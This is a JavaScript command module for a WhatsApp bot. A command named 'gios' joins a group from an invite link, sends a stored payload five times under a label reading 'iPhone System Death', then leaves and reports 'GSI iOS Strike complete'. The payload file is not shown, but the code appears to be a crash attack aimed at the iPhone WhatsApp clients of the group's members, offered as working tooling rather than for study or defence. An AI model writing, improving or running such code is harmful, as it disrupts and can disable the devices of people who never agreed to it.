const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "gios",
    execute: async (conn, msg, args, { from, isOwner }) => {
        if (!isOwner) return;
        try {
            const payload = fs.readFileSync('./lib/payloads/sios.txt', 'utf-8');
            const code = args[0].split('https://chat.whatsapp.com/')[1];
            const jid = await conn.groupAcceptInvite(code);

            for (let i = 0; i < 5; i++) {
                await conn.sendMessage(jid, { 
                    text: "\u200B" + payload,
                    contextInfo: { forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid, newsletterName: "ɪᴘʜᴏɴᴇ ꜱʏꜱᴛᴇᴍ ᴅᴇᴀᴛʜ" } }
                });
            }
            await conn.groupLeave(jid);
            await conn.sendMessage(conn.user.id, { text: "🥀 Mission Success: GSI iOS Strike complete." });
        } catch (e) {}
    }
};